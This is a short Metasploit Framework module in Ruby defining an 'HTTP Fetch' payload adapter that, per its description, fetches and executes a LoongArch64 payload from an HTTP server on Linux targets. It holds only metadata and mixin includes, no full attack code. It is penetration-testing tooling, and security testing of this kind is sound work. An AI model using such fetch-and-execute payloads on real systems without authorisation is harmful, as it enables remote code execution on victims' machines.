##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::HTTP
  include Msf::Payload::Adapter::Fetch::LinuxOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTP Fetch',
        'Description' => 'Fetch and execute a LoongArch64 payload from an HTTP server.',
        'Author' => [
          'Brendan Watters', # Fetch payload adapter
          'Spencer McIntyre' # Fetch payload adapter
        ],
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_LOONGARCH64,
        'AdaptedPlatform' => 'linux'
      )
    )
  end
end
